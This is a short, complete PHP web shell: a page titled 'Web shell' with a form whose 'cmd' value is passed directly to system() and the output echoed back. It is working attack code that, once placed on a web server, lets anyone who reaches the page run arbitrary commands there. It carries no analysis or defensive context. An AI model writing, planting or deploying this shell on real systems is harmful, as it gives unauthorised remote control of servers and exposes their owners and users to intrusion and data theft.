<h2>
    Web shell
</h2>
<form method="GET">
    <input name="cmd" type="text" />
    <input type="submit" value="Submit" />
</form>
<div class="output">
    <?php

    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }

    ?>
</div>